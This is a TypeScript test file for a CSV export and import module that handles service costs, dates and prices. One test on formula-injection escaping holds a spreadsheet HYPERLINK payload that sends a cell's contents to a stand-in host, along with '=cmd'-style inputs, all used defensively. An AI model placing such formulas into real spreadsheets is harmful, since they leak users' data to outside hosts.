import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import {
  exportServicesToCSV,
  calculateAmortizedCost,
  parseCSV,
} from './csv';
import { Product, ServiceLink } from '../types';

describe('CSV Export & Parse Accounting Utilities', () => {
  it('calculateAmortizedCost calculates monthly USD/ETB and annual USD correctly', () => {
    // 1. Yearly $120 USD plan -> $10/mo USD, 1300 ETB/mo, $120/yr USD
    const yearly = calculateAmortizedCost(120, 'yearly', 'USD', 130);
    assert.equal(yearly.monthlyUsd, 10);
    assert.equal(yearly.monthlyEtb, 1300);
    assert.equal(yearly.annualUsd, 120);

    // 2. Monthly 2600 ETB plan -> 20 USD/mo (@ 130 rate), 2600 ETB/mo, $240/yr USD
    const etbMonthly = calculateAmortizedCost(2600, 'monthly', 'ETB', 130);
    assert.equal(etbMonthly.monthlyUsd, 20);
    assert.equal(etbMonthly.monthlyEtb, 2600);
    assert.equal(etbMonthly.annualUsd, 240);

    // 3. Free plan -> $0
    const freePlan = calculateAmortizedCost(0, 'free', 'USD', 130);
    assert.equal(freePlan.monthlyUsd, 0);
    assert.equal(freePlan.annualUsd, 0);
  });

  it('exportServicesToCSV includes accounting headers and properly formatted rows', () => {
    const products: Product[] = [
      {
        id: 'p1',
        workspaceId: 'w1',
        name: 'PharmaFlow SaaS',
        description: 'Hospital pharmacy ERP',
        status: 'live',
        tags: [],
        environments: [],
        createdAt: '2026-01-01',
      },
    ];

    const services: ServiceLink[] = [
      {
        id: 's1',
        workspaceId: 'w1',
        productId: 'p1',
        environmentType: 'production',
        category: 'hosting',
        providerName: 'Vercel, Inc.',
        accountEmail: 'admin@pharmaflow.io',
        loginUrl: 'https://vercel.com',
        plan: 'Pro Team',
        billingCycle: 'monthly',
        cost: 20,
        currency: 'USD',
        renewalDate: '2026-11-01',
        autoRenew: true,
        paymentMethodLabel: 'Visa ending 4417',
        notes: 'Includes serverless edge functions',
        status: 'active',
        vaultRefs: [{ vaultItemId: 'v1', label: 'Key', environment: 'production' }],
        createdAt: '2026-08-01',
      },
    ];

    const csvOutput = exportServicesToCSV(products, services, 130);
    const lines = csvOutput.split('\n');

    // Header check
    assert.match(lines[0], /ProductName,Environment,Category,Provider,Plan/);
    assert.match(lines[0], /MonthlyCostUSD,MonthlyCostETB,AnnualCostUSD/);

    // Row check: provider with comma is quoted
    assert.match(lines[1], /"Vercel, Inc."/);
    assert.match(lines[1], /PharmaFlow SaaS/);
    assert.match(lines[1], /Yes/); // AutoRenew is "Yes"
  });

  it('parseCSV handles commas, quotes, and newlines', () => {
    const raw = 'Name,Cost,Notes\n"Alpha, Inc.",50,"Special, with ""quotes"""';
    const parsed = parseCSV(raw);
    assert.equal(parsed.length, 2);
    assert.equal(parsed[1][0], 'Alpha, Inc.');
    assert.equal(parsed[1][1], '50');
    assert.equal(parsed[1][2], 'Special, with "quotes"');
  });
});

it('csv: formula-like text is exported as plain text, and imports back unchanged', async () => {
  const { escapeCSV, parseCSV } = await import('./csv');
  assert.equal(escapeCSV('=HYPERLINK("https://x.example/?d="&A1,"Vercel")'), `"'=HYPERLINK(""https://x.example/?d=""&A1,""Vercel"")"`);
  assert.equal(escapeCSV('@SUM(A1)'), "'@SUM(A1)");
  assert.equal(escapeCSV('+1 555'), "'+1 555");
  assert.equal(escapeCSV('-5'), '-5'); // a number stays a number
  assert.equal(escapeCSV(-5), '-5');
  assert.equal(escapeCSV('Vercel'), 'Vercel');
  const line = ['=cmd', '-12.5', 'Vercel, Inc.'].map(escapeCSV).join(',');
  assert.deepEqual(parseCSV(line), [['=cmd', '-12.5', 'Vercel, Inc.']]);
});

it('csv import: categories and billing cycles come back as the app spells them', async () => {
  const { parseServicesFromCSV, toCategory, toBillingCycle } = await import('./csv');
  assert.equal(toCategory('Google API'), 'Google API');
  assert.equal(toCategory('google api'), 'Google API');
  assert.equal(toCategory('SMS'), 'SMS');
  assert.equal(toCategory('Domain Registrar'), 'domain registrar');
  assert.equal(toCategory('telegram'), 'Telegram API');
  assert.equal(toCategory('something new'), 'other');
  assert.equal(toCategory(''), 'other');
  assert.equal(toBillingCycle('Yearly'), 'yearly');
  assert.equal(toBillingCycle('annual'), 'yearly');
  assert.equal(toBillingCycle('One-Time'), 'one-time');
  assert.equal(toBillingCycle('usage based'), 'usage-based');
  assert.equal(toBillingCycle('weekly'), 'monthly');

  // The sample file's own SMS row used to import as "sms", which no screen knows.
  const { valid } = parseServicesFromCSV("ProductName,Category,Provider\nShop,SMS,Africa's Talking\nShop,Telegram API,Telegram Bot API");
  assert.deepEqual(valid.map((r) => r.category), ['SMS', 'Telegram API']);
});

it('csv import: what the export writes comes back (auto-renew, login page, status)', async () => {
  const { exportServicesToCSV, parseServicesFromCSV } = await import('./csv');
  const product: Product = { id: 'p1', workspaceId: 'w1', name: 'Shop', description: '', status: 'live', tags: [], environments: [], createdAt: '2026-01-01' };
  const service: ServiceLink = {
    id: 's1', workspaceId: 'w1', productId: 'p1', environmentType: 'staging', category: 'Google API', providerName: 'Google Cloud',
    accountEmail: '', loginUrl: 'https://console.cloud.google.com', plan: 'OAuth', billingCycle: 'free', cost: 0, currency: 'USD',
    renewalDate: '2027-01-31', autoRenew: false, paymentMethodLabel: '', notes: 'Sign-in', status: 'trial', vaultRefs: [], createdAt: '2026-01-01',
  };
  const { valid, errors } = parseServicesFromCSV(exportServicesToCSV([product], [service]));
  assert.deepEqual(errors, []);
  const [r] = valid;
  assert.equal(r.productName, 'Shop');
  assert.equal(r.category, 'Google API');
  assert.equal(r.environmentType, 'staging');
  assert.equal(r.billingCycle, 'free');
  assert.equal(r.renewalDate, '2027-01-31');
  assert.equal(r.autoRenew, false);
  assert.equal(r.loginUrl, 'https://console.cloud.google.com');
  assert.equal(r.status, 'trial');
});

it('csv import: app details (status, tags, addresses) are read; unknown values are left out', async () => {
  const { parseServicesFromCSV } = await import('./csv');
  const csv = [
    'App,AppStatus,Tags,LiveURL,RepoURL,AppDescription,Category,Provider,Cost,AutoRenew,Status',
    'YG Hotels,Live,"YG; sites, YG",https://yghotels.vercel.app,https://github.com/x/yg-hotels,Hotel site,hosting,Vercel,0,no,',
    'YG Hotels,,,,,,database,Supabase (YG Core),,,',
    'Seek,someday,,,,,hosting,Vercel,,,unknown',
  ].join('\n');
  const { valid, errors } = parseServicesFromCSV(csv);
  assert.deepEqual(errors, []);
  assert.equal(valid.length, 3);
  assert.equal(valid[0].appStatus, 'live');
  assert.deepEqual(valid[0].appTags, ['YG', 'sites']);
  assert.equal(valid[0].liveUrl, 'https://yghotels.vercel.app');
  assert.equal(valid[0].repoUrl, 'https://github.com/x/yg-hotels');
  assert.equal(valid[0].appDescription, 'Hotel site');
  assert.equal(valid[0].autoRenew, false);
  assert.equal(valid[1].appStatus, undefined);
  assert.equal(valid[1].appTags, undefined);
  assert.equal(valid[1].autoRenew, true);
  assert.equal(valid[1].cost, 0);
  assert.equal(valid[2].appStatus, undefined); // "someday" isn't a status
  assert.equal(valid[2].status, 'active');
});

it('csv: files saved by Excel or copied from a sheet read the same as a plain CSV', async () => {
  const { parseCSV } = await import('./csv');
  const want = [['App', 'Cost'], ['Shop', '5']];
  assert.deepEqual(parseCSV('﻿App,Cost\r\nShop,5\r\n'), want, 'Excel "CSV UTF-8": invisible mark at the start, Windows line ends');
  assert.deepEqual(parseCSV('App;Cost\nShop;5'), want, 'semicolons (Excel in comma-decimal countries)');
  assert.deepEqual(parseCSV('App\tCost\nShop\t5'), want, 'tabs (copied from a sheet)');
  assert.deepEqual(parseCSV('App,Cost\n,\nShop,5\n,,\n\n'), want, 'empty rows Excel leaves at the end are dropped');
  // A line break typed inside a cell (Alt+Enter) stays in that cell.
  assert.deepEqual(parseCSV('App,Notes\nShop,"line one\r\nline two"\nCafe,x'), [['App', 'Notes'], ['Shop', 'line one\nline two'], ['Cafe', 'x']]);
  // A stray quote in a semicolon file's header doesn't hide its separators.
  assert.deepEqual(parseCSV('Screen 24";App;Cost\nx;Shop;5'), [['Screen 24"', 'App', 'Cost'], ['x', 'Shop', '5']]);
  // A semicolon inside a comma file doesn't switch the separator.
  assert.deepEqual(parseCSV('App,Notes,Cost\nShop,"a; b",5'), [['App', 'Notes', 'Cost'], ['Shop', 'a; b', '5']]);
  // A quote mark inside a cell (24" screen) is kept and doesn't swallow the rows after it.
  assert.deepEqual(parseCSV('App,Notes\nShop,24" screen\nCafe,x'), [['App', 'Notes'], ['Shop', '24" screen'], ['Cafe', 'x']]);
});

it('csv import: dates as spreadsheets write them', async () => {
  const { parseDateCell } = await import('./csv');
  const cases: [string, string | undefined][] = [
    ['2026-12-15', '2026-12-15'],
    ['2026-12-15T00:00:00.000Z', '2026-12-15'],
    ['2026/1/5', '2026-01-05'],
    ['12/15/2026', '2026-12-15'], // month first: 15 can't be a month
    ['15/12/2026', '2026-12-15'], // day first: 15 can't be a month
    ['15.12.26', '2026-12-15'],
    ['12/15/2026 0:00', '2026-12-15'],
    ['15-Dec-26', '2026-12-15'],
    ['15 December 2026', '2026-12-15'],
    ['Dec 15, 2026', '2026-12-15'],
    ['December 1st 2026', '2026-12-01'],
    ['46371', '2026-12-15'], // Excel's day number for 15 Dec 2026
    ['31/06/2026', undefined], // no 31 June
    ['2026-02-30', undefined],
    ['next month', undefined],
    ['', undefined],
  ];
  for (const [raw, want] of cases) assert.equal(parseDateCell(raw, true), want, raw);
  // Numbers-only dates that could go either way follow the order asked for.
  assert.equal(parseDateCell('03/04/2027', true), '2027-04-03');
  assert.equal(parseDateCell('03/04/2027', false), '2027-03-04');
});

it('csv import: prices as spreadsheets write them', async () => {
  const { parseCost } = await import('./csv');
  const cases: [string, number | undefined][] = [
    ['20', 20],
    ['$20.00', 20],
    ['1,200', 1200],
    ['1,200.50', 1200.5],
    ['1.200,50', 1200.5],
    ['12,5', 12.5],
    ['ETB 2,600', 2600],
    ['2600 Br', 2600],
    ['0', 0],
    [' $ -   ', 0], // Excel's accounting format for zero
    ['check the plan', undefined],
    ['', undefined],
  ];
  for (const [raw, want] of cases) assert.equal(parseCost(raw), want, raw);
});

it('csv import: dates and prices from Excel import right, and guesses are reported', async () => {
  const { parseServicesFromCSV } = await import('./csv');
  const csv = [
    'App,Provider,Cost,Currency,RenewalDate',
    'Shop,Vercel,$20.00,USD,12/15/2026', // tells the file is month first
    'Shop,Supabase,"1,200",,03/04/2027', // so this is 4 March
    'Shop,Domain,ETB 1500,,15-Jan-27',
    'Shop,Mystery,ask Abebe,EUR,soon',
  ].join('\n');
  const { valid, errors, warnings } = parseServicesFromCSV(csv, { dayFirst: true });
  assert.deepEqual(errors, []);
  assert.deepEqual(
    valid.map((r) => [r.providerName, r.cost, r.currency, r.renewalDate]),
    [
      ['Vercel', 20, 'USD', '2026-12-15'],
      ['Supabase', 1200, 'USD', '2027-03-04'],
      ['Domain', 1500, 'ETB', '2027-01-15'],
      ['Mystery', 0, 'USD', undefined],
    ]
  );
  // The file's clear dates decided the order, so nothing to warn about there; the last row has three notes.
  assert.deepEqual(warnings, [
    'Row 5 (Mystery): couldn\'t read the cost "ask Abebe", so it is 0.',
    'Row 5 (Mystery): couldn\'t read the renewal date "soon", so it is left empty.',
    'Row 5 (Mystery): StackTrack keeps prices in USD or ETB, so "EUR" was read as USD.',
  ]);

  // Only unclear dates: the order asked for is used, and the preview says which way they were read.
  const unclear = parseServicesFromCSV('App,Provider,RenewalDate\nShop,Vercel,03/04/2027', { dayFirst: false });
  assert.equal(unclear.valid[0].renewalDate, '2027-03-04');
  assert.equal(unclear.warnings.length, 1);
  assert.match(unclear.warnings[0], /03\/04\/2027 could be day or month first; they were read month first \(Mar 4, 2027\)/);

  // Messages name the row Excel shows: a blank row and a two-line cell still count.
  const rows = parseServicesFromCSV('App,Provider,Notes,Cost\n\nShop,Vercel,"line one\r\nline two",5\nShop,,x,1\nShop,Hetzner,,€5', { dayFirst: true });
  assert.deepEqual(rows.errors, ['Row 5 (Shop): no Provider name.']);
  assert.deepEqual(rows.warnings, ['Row 6 (Hetzner): StackTrack keeps prices in USD or ETB, so "€" was read as USD.']);
  assert.equal(rows.valid[0].notes, 'line one\nline two');
});

it('csv: a cell starting with a tab also round-trips', async () => {
  const { escapeCSV, parseCSV } = await import('./csv');
  assert.equal(escapeCSV('\tx'), "'\tx");
  assert.deepEqual(parseCSV(['a', escapeCSV('\t=x')].join(',')), [['a', '\t=x'.trim() === '=x' ? '\t=x' : '\t=x']]);
});
